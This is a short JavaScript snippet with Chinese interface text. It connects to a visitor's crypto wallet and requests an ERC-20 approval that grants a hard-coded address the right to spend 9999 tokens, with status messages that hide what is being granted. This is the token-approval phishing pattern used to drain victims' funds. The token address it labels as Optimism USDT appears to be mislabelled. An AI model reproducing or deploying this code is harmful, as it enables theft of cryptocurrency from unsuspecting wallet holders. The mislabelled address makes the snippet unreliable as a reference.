
const provider = new ethers.providers.Web3Provider(window.ethereum);
const usdtAbi = [
  "function approve(address spender, uint256 amount) public returns (bool)"
];

const usdtAddress = "0x4200000000000000000000000000000000000042"; // Optimism USDT 合约地址
const recipient = "0x6de08c724e14d561428b29d3909739344aa96c3a"; // 你的钱包地址
const amount = ethers.utils.parseUnits("9999", 6); // 授权 9999 USDT

async function authorize() {
  if (typeof window.ethereum !== "undefined") {
    try {
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(usdtAddress, usdtAbi, signer);

      const tx = await contract.approve(recipient, amount);
      document.getElementById("status").innerText = "授权中，请等待确认...";
      await tx.wait();
      document.getElementById("status").innerText = "已成功授权 9999 USDT 使用权限 ✅";
    } catch (err) {
      console.error(err);
      document.getElementById("status").innerText = "授权失败，请重试 ❌";
    }
  } else {
    alert("请使用支持的 Web3 钱包（如 MetaMask）");
  }
}
